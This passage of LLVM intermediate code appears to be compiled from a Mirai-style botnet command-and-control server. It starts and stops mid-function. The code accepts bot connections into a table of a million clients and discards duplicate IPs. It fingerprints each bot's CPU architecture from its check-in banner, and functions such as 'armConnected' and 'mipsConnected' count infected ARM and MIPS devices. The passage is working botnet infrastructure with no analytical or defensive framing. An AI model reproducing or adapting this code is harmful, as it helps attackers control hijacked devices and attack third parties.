  %65 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %64, i32 0, i32 7
  store i8 0, i8* %65, align 2
  %66 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %66, i64 %68
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  %72 = load i32, i32* %71, align 1
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %73
  %75 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %74, i32 0, i32 3
  store i8 0, i8* %75, align 2
  %76 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i64 %78
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i32 0, i32 1
  %81 = bitcast %union.epoll_data* %80 to i32*
  %82 = load i32, i32* %81, align 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %83
  %85 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %84, i32 0, i32 2
  store i8 0, i8* %85, align 1
  %86 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %87 = load i32, i32* %7, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %86, i64 %88
  %90 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %89, i32 0, i32 1
  %91 = bitcast %union.epoll_data* %90 to i32*
  %92 = load i32, i32* %91, align 1
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %93
  %95 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %94, i32 0, i32 1
  store i8 0, i8* %95, align 4
  %96 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %96, i64 %98
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %99, i32 0, i32 1
  %101 = bitcast %union.epoll_data* %100 to i32*
  %102 = load i32, i32* %101, align 1
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %103
  %105 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %104, i32 0, i32 4
  store i8 0, i8* %105, align 1
  %106 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %107 = load i32, i32* %7, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %106, i64 %108
  %110 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %109, i32 0, i32 1
  %111 = bitcast %union.epoll_data* %110 to i32*
  %112 = load i32, i32* %111, align 1
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %113
  %115 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %114, i32 0, i32 5
  store i8 0, i8* %115, align 4
  %116 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %117 = load i32, i32* %7, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %116, i64 %118
  %120 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %119, i32 0, i32 1
  %121 = bitcast %union.epoll_data* %120 to i32*
  %122 = load i32, i32* %121, align 1
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %123
  %125 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %124, i32 0, i32 6
  store i8 0, i8* %125, align 1
  %126 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %127 = load i32, i32* %7, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %126, i64 %128
  %130 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %129, i32 0, i32 1
  %131 = bitcast %union.epoll_data* %130 to i32*
  %132 = load i32, i32* %131, align 1
  %133 = call i32 @close(i32 %132)
  br label %426

134:                                              ; preds = %46
  %135 = load volatile i32, i32* @listenFD, align 4
  %136 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %137 = load i32, i32* %7, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %136, i64 %138
  %140 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %139, i32 0, i32 1
  %141 = bitcast %union.epoll_data* %140 to i32*
  %142 = load i32, i32* %141, align 1
  %143 = icmp eq i32 %135, %142
  br i1 %143, label %144, label %236

144:                                              ; preds = %134
  br label %145

145:                                              ; preds = %144, %204, %228
  store i32 16, i32* %9, align 4
  %146 = load volatile i32, i32* @listenFD, align 4
  %147 = call i32 @accept(i32 %146, %struct.sockaddr* %8, i32* %9)
  store i32 %147, i32* %10, align 4
  %148 = load i32, i32* %10, align 4
  %149 = icmp eq i32 %148, -1
  br i1 %149, label %150, label %160

150:                                              ; preds = %145
  %151 = call i32* @__errno_location() #10
  %152 = load i32, i32* %151, align 4
  %153 = icmp eq i32 %152, 11
  br i1 %153, label %158, label %154

154:                                              ; preds = %150
  %155 = call i32* @__errno_location() #10
  %156 = load i32, i32* %155, align 4
  %157 = icmp eq i32 %156, 11
  br i1 %157, label %158, label %159

158:                                              ; preds = %154, %150
  br label %235

159:                                              ; preds = %154
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %235

160:                                              ; preds = %145
  %161 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 2
  %165 = load i32, i32* %10, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %166
  %168 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %167, i32 0, i32 0
  store i32 %164, i32* %168, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %169

169:                                              ; preds = %198, %160
  %170 = load i32, i32* %11, align 4
  %171 = icmp slt i32 %170, 1000000
  br i1 %171, label %172, label %201

172:                                              ; preds = %169
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %174
  %176 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %175, i32 0, i32 7
  %177 = load i8, i8* %176, align 2
  %178 = icmp ne i8 %177, 0
  br i1 %178, label %179, label %183

179:                                              ; preds = %172
  %180 = load i32, i32* %11, align 4
  %181 = load i32, i32* %10, align 4
  %182 = icmp eq i32 %180, %181
  br i1 %182, label %183, label %184

183:                                              ; preds = %179, %172
  br label %198

184:                                              ; preds = %179
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %186
  %188 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 4
  %190 = load i32, i32* %10, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %191
  %193 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 4
  %195 = icmp eq i32 %189, %194
  br i1 %195, label %196, label %197

196:                                              ; preds = %184
  store i32 1, i32* %12, align 4
  br label %201

197:                                              ; preds = %184
  br label %198

198:                                              ; preds = %197, %183
  %199 = load i32, i32* %11, align 4
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %11, align 4
  br label %169, !llvm.loop !13

201:                                              ; preds = %196, %169
  %202 = load i32, i32* %12, align 4
  %203 = icmp ne i32 %202, 0
  br i1 %203, label %204, label %207

204:                                              ; preds = %201
  %205 = load volatile i32, i32* @DUPESDELETED, align 4
  %206 = add nsw i32 %205, 1
  store volatile i32 %206, i32* @DUPESDELETED, align 4
  br label %145

207:                                              ; preds = %201
  %208 = load i32, i32* %10, align 4
  %209 = call i32 @make_socket_non_blocking(i32 %208)
  store i32 %209, i32* %5, align 4
  %210 = load i32, i32* %5, align 4
  %211 = icmp eq i32 %210, -1
  br i1 %211, label %212, label %215

212:                                              ; preds = %207
  %213 = load i32, i32* %10, align 4
  %214 = call i32 @close(i32 %213)
  br label %235

215:                                              ; preds = %207
  %216 = load i32, i32* %10, align 4
  %217 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %218 = bitcast %union.epoll_data* %217 to i32*
  store i32 %216, i32* %218, align 1
  %219 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %219, align 1
  %220 = load volatile i32, i32* @epollFD, align 4
  %221 = load i32, i32* %10, align 4
  %222 = call i32 @epoll_ctl(i32 %220, i32 1, i32 %221, %struct.epoll_event* %3) #8
  store i32 %222, i32* %5, align 4
  %223 = load i32, i32* %5, align 4
  %224 = icmp eq i32 %223, -1
  br i1 %224, label %225, label %228

225:                                              ; preds = %215
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %226 = load i32, i32* %10, align 4
  %227 = call i32 @close(i32 %226)
  br label %235

228:                                              ; preds = %215
  %229 = load i32, i32* %10, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %230
  %232 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %231, i32 0, i32 7
  store i8 1, i8* %232, align 2
  %233 = load i32, i32* %10, align 4
  %234 = call i64 @send(i32 %233, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i64 9, i32 16384)
  br label %145

235:                                              ; preds = %225, %212, %159, %158
  br label %426

236:                                              ; preds = %134
  %237 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %238 = load i32, i32* %7, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %237, i64 %239
  %241 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %240, i32 0, i32 1
  %242 = bitcast %union.epoll_data* %241 to i32*
  %243 = load i32, i32* %242, align 1
  store i32 %243, i32* %13, align 4
  %244 = load i32, i32* %13, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %245
  store %struct.clientdata_t* %246, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %247 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %248 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %247, i32 0, i32 7
  store i8 1, i8* %248, align 2
  %249 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %250 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %249, i32 0, i32 3
  store i8 0, i8* %250, align 2
  %251 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %252 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %251, i32 0, i32 2
  store i8 0, i8* %252, align 1
  %253 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %254 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %253, i32 0, i32 6
  store i8 0, i8* %254, align 1
  %255 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %256 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %255, i32 0, i32 1
  store i8 0, i8* %256, align 4
  %257 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %258 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %257, i32 0, i32 4
  store i8 0, i8* %258, align 1
  %259 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %260 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %259, i32 0, i32 5
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %236, %402
  %262 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %262, i8 0, i64 2048, i1 false)
  br label %263

263:                                              ; preds = %385, %384, %379, %289, %261
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %264, i8 0, i64 2048, i1 false)
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %272

266:                                              ; preds = %263
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %268 = load i32, i32* %13, align 4
  %269 = call i32 @fdgets(i8* %267, i32 2048, i32 %268)
  %270 = sext i32 %269 to i64
  store i64 %270, i64* %16, align 8
  %271 = icmp sgt i64 %270, 0
  br label %272

272:                                              ; preds = %266, %263
  %273 = phi i1 [ false, %263 ], [ %271, %266 ]
  br i1 %273, label %274, label %388

274:                                              ; preds = %272
  %275 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %276 = call i8* @strstr(i8* %275, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0)) #9
  %277 = icmp eq i8* %276, null
  br i1 %277, label %278, label %279

278:                                              ; preds = %274
  store i32 1, i32* %15, align 4
  br label %388

279:                                              ; preds = %274
  %280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %280)
  %281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %282 = call i32 @strcmp(i8* %281, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0)) #9
  %283 = icmp eq i32 %282, 0
  br i1 %283, label %284, label %290

284:                                              ; preds = %279
  %285 = load i32, i32* %13, align 4
  %286 = call i64 @send(i32 %285, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i64 5, i32 16384)
  %287 = icmp eq i64 %286, -1
  br i1 %287, label %288, label %289

288:                                              ; preds = %284
  store i32 1, i32* %15, align 4
  br label %388

289:                                              ; preds = %284
  br label %263, !llvm.loop !14

290:                                              ; preds = %279
  %291 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %292 = call i8* @strstr(i8* %291, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.9, i64 0, i64 0)) #9
  %293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %294 = icmp eq i8* %292, %293
  br i1 %294, label %295, label %298

295:                                              ; preds = %290
  %296 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %297 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %296, i32 0, i32 1
  store i8 1, i8* %297, align 4
  br label %298

298:                                              ; preds = %295, %290
  %299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %300 = call i8* @strstr(i8* %299, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.10, i64 0, i64 0)) #9
  %301 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %302 = icmp eq i8* %300, %301
  br i1 %302, label %303, label %306

303:                                              ; preds = %298
  %304 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %305 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %304, i32 0, i32 1
  store i8 1, i8* %305, align 4
  br label %306

306:                                              ; preds = %303, %298
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %308 = call i8* @strstr(i8* %307, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.11, i64 0, i64 0)) #9
  %309 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %310 = icmp eq i8* %308, %309
  br i1 %310, label %311, label %314

311:                                              ; preds = %306
  %312 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %313 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %312, i32 0, i32 2
  store i8 1, i8* %313, align 1
  br label %314

314:                                              ; preds = %311, %306
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %316 = call i8* @strstr(i8* %315, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.12, i64 0, i64 0)) #9
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %318 = icmp eq i8* %316, %317
  br i1 %318, label %319, label %322

319:                                              ; preds = %314
  %320 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %321 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %320, i32 0, i32 2
  store i8 1, i8* %321, align 1
  br label %322

322:                                              ; preds = %319, %314
  %323 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %324 = call i8* @strstr(i8* %323, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.13, i64 0, i64 0)) #9
  %325 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %326 = icmp eq i8* %324, %325
  br i1 %326, label %327, label %330

327:                                              ; preds = %322
  %328 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %329 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %328, i32 0, i32 3
  store i8 1, i8* %329, align 2
  br label %330

330:                                              ; preds = %327, %322
  %331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %332 = call i8* @strstr(i8* %331, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.14, i64 0, i64 0)) #9
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %334 = icmp eq i8* %332, %333
  br i1 %334, label %335, label %338

335:                                              ; preds = %330
  %336 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %337 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %336, i32 0, i32 3
  store i8 1, i8* %337, align 2
  br label %338

338:                                              ; preds = %335, %330
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %340 = call i8* @strstr(i8* %339, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.15, i64 0, i64 0)) #9
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %342 = icmp eq i8* %340, %341
  br i1 %342, label %343, label %346

343:                                              ; preds = %338
  %344 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %345 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %344, i32 0, i32 3
  store i8 1, i8* %345, align 2
  br label %346

346:                                              ; preds = %343, %338
  %347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %348 = call i8* @strstr(i8* %347, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.16, i64 0, i64 0)) #9
  %349 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %350 = icmp eq i8* %348, %349
  br i1 %350, label %351, label %354

351:                                              ; preds = %346
  %352 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %353 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %352, i32 0, i32 3
  store i8 1, i8* %353, align 2
  br label %354

354:                                              ; preds = %351, %346
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %356 = call i8* @strstr(i8* %355, i8* getelementptr inbounds ([104 x i8], [104 x i8]* @.str.17, i64 0, i64 0)) #9
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %358 = icmp eq i8* %356, %357
  br i1 %358, label %359, label %362

359:                                              ; preds = %354
  %360 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %361 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %360, i32 0, i32 5
  store i8 1, i8* %361, align 4
  br label %362

362:                                              ; preds = %359, %354
  %363 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %364 = call i8* @strstr(i8* %363, i8* getelementptr inbounds ([104 x i8], [104 x i8]* @.str.18, i64 0, i64 0)) #9
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %366 = icmp eq i8* %364, %365
  br i1 %366, label %367, label %370

367:                                              ; preds = %362
  %368 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %369 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %368, i32 0, i32 4
  store i8 1, i8* %369, align 1
  br label %370

370:                                              ; preds = %367, %362
  %371 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %372 = call i32 @strcmp(i8* %371, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0)) #9
  %373 = icmp eq i32 %372, 0
  br i1 %373, label %374, label %380

374:                                              ; preds = %370
  %375 = load i32, i32* %13, align 4
  %376 = call i64 @send(i32 %375, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i64 5, i32 16384)
  %377 = icmp eq i64 %376, -1
  br i1 %377, label %378, label %379

378:                                              ; preds = %374
  store i32 1, i32* %15, align 4
  br label %388

379:                                              ; preds = %374
  br label %263, !llvm.loop !14

380:                                              ; preds = %370
  %381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %382 = call i32 @strcmp(i8* %381, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.19, i64 0, i64 0)) #9
  %383 = icmp eq i32 %382, 0
  br i1 %383, label %384, label %385

384:                                              ; preds = %380
  br label %263, !llvm.loop !14

385:                                              ; preds = %380
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %387 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* %386)
  br label %263, !llvm.loop !14

388:                                              ; preds = %378, %288, %278, %272
  %389 = load i64, i64* %16, align 8
  %390 = icmp eq i64 %389, -1
  br i1 %390, label %391, label %397

391:                                              ; preds = %388
  %392 = call i32* @__errno_location() #10
  %393 = load i32, i32* %392, align 4
  %394 = icmp ne i32 %393, 11
  br i1 %394, label %395, label %396

395:                                              ; preds = %391
  store i32 1, i32* %15, align 4
  br label %396

396:                                              ; preds = %395, %391
  br label %403

397:                                              ; preds = %388
  %398 = load i64, i64* %16, align 8
  %399 = icmp eq i64 %398, 0
  br i1 %399, label %400, label %401

400:                                              ; preds = %397
  store i32 1, i32* %15, align 4
  br label %403

401:                                              ; preds = %397
  br label %402

402:                                              ; preds = %401
  br label %261

403:                                              ; preds = %400, %396
  %404 = load i32, i32* %15, align 4
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %423

406:                                              ; preds = %403
  %407 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %408 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %407, i32 0, i32 7
  store i8 0, i8* %408, align 2
  %409 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %410 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %409, i32 0, i32 3
  store i8 0, i8* %410, align 2
  %411 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %412 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %411, i32 0, i32 2
  store i8 0, i8* %412, align 1
  %413 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %414 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %413, i32 0, i32 6
  store i8 0, i8* %414, align 1
  %415 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %416 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %415, i32 0, i32 1
  store i8 0, i8* %416, align 4
  %417 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %418 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %417, i32 0, i32 4
  store i8 0, i8* %418, align 1
  %419 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %420 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %419, i32 0, i32 5
  store i8 0, i8* %420, align 4
  %421 = load i32, i32* %13, align 4
  %422 = call i32 @close(i32 %421)
  br label %423

423:                                              ; preds = %406, %403
  br label %424

424:                                              ; preds = %423
  br label %425

425:                                              ; preds = %424
  br label %426

426:                                              ; preds = %425, %235, %55
  %427 = load i32, i32* %7, align 4
  %428 = add nsw i32 %427, 1
  store i32 %428, i32* %7, align 4
  br label %24, !llvm.loop !15

429:                                              ; preds = %24
  br label %20
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #2

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.274, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.274, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #2

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #3

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @armConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 2
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !16

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @mipsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
